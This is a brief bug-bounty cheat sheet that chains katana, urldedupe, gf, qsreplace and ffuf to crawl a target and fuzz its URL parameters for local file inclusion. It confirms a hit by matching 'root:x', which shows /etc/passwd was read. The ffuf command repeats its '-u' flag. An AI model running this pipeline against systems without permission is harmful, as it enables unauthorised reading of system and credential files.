# How to Hunt for LFI Vulnerabilities

```bash 
echo "example.com" | katana -o katana.txt

cat katana.txt | sort -u | urldedupe > urls.txt

cat urls.txt | gf lfi | qsreplace FUZZ > lfi.txt

ffuf -u FUZZ -w lfi.txt:URL -w lfiPayloads.txt:PAYLOAD -u URL -mr "root:x"

```




